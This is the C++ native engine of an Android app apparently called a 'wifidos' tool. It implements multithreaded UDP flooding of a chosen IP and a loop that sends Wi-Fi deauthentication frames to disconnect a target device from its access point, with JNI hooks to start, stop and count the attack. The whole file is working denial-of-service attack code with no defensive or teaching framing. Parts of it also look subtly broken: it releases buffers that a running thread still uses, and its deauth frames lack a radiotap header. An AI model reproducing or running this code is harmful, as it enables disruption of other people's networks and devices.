#include <jni.h>
#include <android/log.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <netinet/if_ether.h>
#include <unistd.h>
#include <thread>
#include <vector>
#include <atomic>
#include <cstring>

#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, "VANTA", __VA_ARGS__)

std::atomic<bool> isAttacking{false};
std::atomic<uint64_t> packetCount{0};

void sendDeauth(int sock, const char* iface, const uint8_t* targetMac, const uint8_t* apMac) {
    uint8_t frame[26];
    frame[0] = 0xC0; frame[1] = 0x00;
    frame[2] = 0x00; frame[3] = 0x00;
    memcpy(frame + 4, targetMac, 6);
    memcpy(frame + 10, apMac, 6);
    memcpy(frame + 16, apMac, 6);
    frame[22] = 0x00; frame[23] = 0x00;
    frame[24] = 0x07; frame[25] = 0x00;

    struct sockaddr_ll addr;
    memset(&addr, 0, sizeof(addr));
    addr.sll_family = AF_PACKET;
    addr.sll_protocol = htons(ETH_P_ALL);
    addr.sll_ifindex = if_nametoindex(iface);
    addr.sll_halen = ETH_ALEN;
    memcpy(addr.sll_addr, targetMac, 6);

    while (isAttacking) {
        if (sendto(sock, frame, sizeof(frame), 0, (struct sockaddr*)&addr, sizeof(addr)) > 0) packetCount++;
    }
}

void udpFlood(const char* targetIp, int port) {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return;
    int optval = 1;
    setsockopt(sock, SOL_SOCKET, SO_NO_CHECK, &optval, sizeof(optval));
    int sndbuf = 4194304;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port);
    inet_pton(AF_INET, targetIp, &dest.sin_addr);

    char payload[1400];
    memset(payload, 'V', sizeof(payload));

    while (isAttacking) {
        if (sendto(sock, payload, sizeof(payload), 0, (struct sockaddr*)&dest, sizeof(dest)) > 0) packetCount++;
    }
    close(sock);
}

extern "C" JNIEXPORT void JNICALL
Java_com_vanta_wifidos_NativeEngine_startAttack(JNIEnv* env, jobject, jstring targetIp, jint threads, jboolean useDeauth, jstring iface, jbyteArray targetMac, jbyteArray apMac) {
    isAttacking = true;
    packetCount = 0;
    const char* ip = env->GetStringUTFChars(targetIp, 0);
    std::vector<std::thread> workers;

    for (int i = 0; i < threads; i++) workers.emplace_back(udpFlood, ip, 80 + (i % 100));

    if (useDeauth && targetMac && apMac && iface) {
        const char* ifName = env->GetStringUTFChars(iface, 0);
        jbyte* tMac = env->GetByteArrayElements(targetMac, 0);
        jbyte* aMac = env->GetByteArrayElements(apMac, 0);
        int rawSock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
        if (rawSock >= 0) workers.emplace_back(sendDeauth, rawSock, ifName, (uint8_t*)tMac, (uint8_t*)aMac);
        env->ReleaseStringUTFChars(iface, ifName);
        env->ReleaseByteArrayElements(targetMac, tMac, 0);
        env->ReleaseByteArrayElements(apMac, aMac, 0);
    }
    for (auto& t : workers) t.join();
    env->ReleaseStringUTFChars(targetIp, ip);
}

extern "C" JNIEXPORT void JNICALL
Java_com_vanta_wifidos_NativeEngine_stopAttack(JNIEnv*, jobject) { isAttacking = false; }

extern "C" JNIEXPORT jlong JNICALL
Java_com_vanta_wifidos_NativeEngine_getPacketCount(JNIEnv*, jobject) { return packetCount.load(); }
